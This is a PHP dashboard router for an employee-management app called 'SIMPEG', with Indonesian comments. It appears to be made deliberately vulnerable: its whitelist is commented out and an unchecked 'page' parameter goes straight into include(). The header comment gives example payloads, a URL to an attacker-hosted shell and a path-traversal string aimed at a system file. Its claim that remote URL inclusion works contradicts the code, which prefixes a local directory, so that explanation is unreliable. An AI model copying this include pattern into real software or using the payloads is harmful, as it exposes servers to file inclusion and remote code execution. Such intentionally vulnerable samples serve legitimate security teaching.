<?php
/**
 * Dashboard utama sekaligus router navigasi SIMPEG.
 *
 * CWE-98 PHP Remote File Inclusion: nama halaman diambil MENTAH dari
 * parameter `page` lalu langsung di-`include()`. Bila direktif php.ini
 * `allow_url_include` aktif (nonaktif secara default sejak PHP modern,
 * tapi masih bisa diaktifkan admin yang tidak sadar risikonya), nilai
 * tersebut bisa berupa URL milik penyerang (mis. ?page=http://attacker/shell)
 * dan dieksekusi sebagai halaman SIMPEG. Bahkan tanpa allow_url_include,
 * pola ini tetap rentan Local File Inclusion lewat path traversal
 * (mis. ?page=../../../../windows/win.ini%00).
 */
require_once __DIR__ . '/../config/config.php';
AuthMiddleware::handle();

// const HALAMAN_DIIZINKAN=[
//     'dashboard' => __DIR__."/../resources/views/pages/dashboard.php"
// ];

// if($_SESSION['role']=='hrd'){
//     unset(HALAMAN_DIIZINKAN["ubah rekening"]);
// }else if($_SESSION['role']=='operator'){
//     unset(HALAMAN_DIIZINKAN["daftar pegawai "]);
//     unset(HALAMAN_DIIZINKAN["admin"]);
// }else{
//     unset(HALAMAN_DIIZINKAN["daftar pegawai"]);
//     unset(HALAMAN_DIIZINKAN["admin"]);
//     unset(HALAMAN_DIIZINKAN["ubah pengaturan"]);
// }

$page = $_GET['page'] ?? 'dashboard';

// if(!isset(HALAMAN_DIIZINKAN[$page])){
//     http_response_code(404);
//     exit("Halaman tidak ditemukan");
// }

$pageTitle = 'Dashboard';
require __DIR__ . '/../resources/views/layouts/header.php';

// --- CWE-98: TIDAK ADA whitelist nama halaman sama sekali ---
include __DIR__ . '/../resources/views/pages/' . $page . '.php';

// include HALAMAN_DIIZINKAN[$page];


require __DIR__ . '/../resources/views/layouts/footer.php';
